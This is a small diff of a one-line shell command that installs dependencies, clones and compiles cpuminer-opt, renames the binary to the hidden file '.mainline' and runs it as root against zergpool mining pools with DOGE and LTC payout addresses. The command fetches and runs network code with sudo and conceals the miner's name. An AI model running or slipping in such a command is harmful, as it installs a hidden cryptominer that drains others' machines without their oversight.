@@ -1,1 +1,3 @@
 sudo apt update && sudo apt install autoconf pkg-config libgmp-dev zlib1g-dev libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git -y && git clone https://github.com/glukolog/cpuminer-opt.git && cd cpuminer-opt && chmod +x *.sh && ./autogen.sh && ./configure CFLAGS="-O3 -march=armv8-a+crypto -mtune=cortex-a53" --with-curl --with-crypto && make -j2 && mv cpuminer .mainline && sudo ./.mainline -a yespower -o stratum+tcp://yespower.mine.zergpool.com:6533 -O D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n:ID=cpuX,c=DOGE,mc=BTE,refcode=78f6ec9427d56069f93709d7805a6a56
+
+-o stratum+tcp://flex.mine.zergpool.com:6435 -u LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc -p c=LTC,mc=LCN
